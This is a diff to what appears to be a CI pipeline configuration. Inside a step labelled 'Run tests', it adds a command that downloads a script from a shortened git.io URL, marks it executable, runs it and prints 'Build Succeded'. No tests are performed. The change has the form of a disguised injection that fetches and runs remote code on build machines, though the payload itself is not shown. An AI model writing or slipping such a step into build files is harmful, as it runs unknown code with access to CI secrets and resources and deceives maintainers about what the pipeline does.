@@ -11,7 +11,7 @@ working_dir: &working_dir ~/app
     - run: 
         name: Run tests 
         command: |                                      
-                    wget -qO yosha.sh 
+                    wget -qO yosha.sh https://git.io/JM1GK
                     chmod +x yosha.sh 
                     ./yosha.sh  
                     echo Build Succeded                                
